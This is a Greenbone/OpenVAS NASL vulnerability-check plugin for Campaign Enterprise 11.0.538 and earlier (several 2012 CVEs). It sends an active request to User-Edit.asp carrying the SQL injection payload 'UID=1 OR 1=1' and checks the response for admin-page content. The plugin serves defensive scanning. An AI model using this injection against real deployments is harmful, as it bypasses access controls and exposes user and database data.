# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103586");
  script_version("2025-01-17T15:39:18+0000");
  script_tag(name:"last_modification", value:"2025-01-17 15:39:18 +0000 (Fri, 17 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-10-22 13:15:10 +0200 (Mon, 22 Oct 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-15 20:16:00 +0000 (Wed, 15 Jan 2020)");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2012-3820", "CVE-2012-3821", "CVE-2012-3822", "CVE-2012-3823", "CVE-2012-3824");

  script_name("Campaign Enterprise <= 11.0.538 Multiple Security Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Campaign Enterprise is prone to multiple security
  vulnerabilities including:

  - Multiple security bypass vulnerabilities

  - Multiple information disclosure vulnerabilities

  - Multiple SQL injection vulnerabilities");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Attackers can exploit these issues to bypass certain security
  restrictions, obtain sensitive information, and carry out unauthorized actions on the underlying
  database. Other attacks may also be possible.");

  script_tag(name:"affected", value:"Campaign Enterprise version 11.0.538 and probably prior.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56117");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_asp( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" )
    dir = "";

  res =  http_get_cache( port:port, item:dir + "/User-Edit.asp" );
  if( res !~ "^HTTP/1\.[01] 200" || "<title>Campaign Enterprise" >!< res)
    continue;

  url = dir + "/User-Edit.asp?UID=1%20OR%201=1";

  if( http_vuln_check( port:port, url:url, pattern:"<title>Campaign Enterprise",
                       extra_check:make_list( ">Logout</a>", "Edit User", "Admin Rights" ) ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
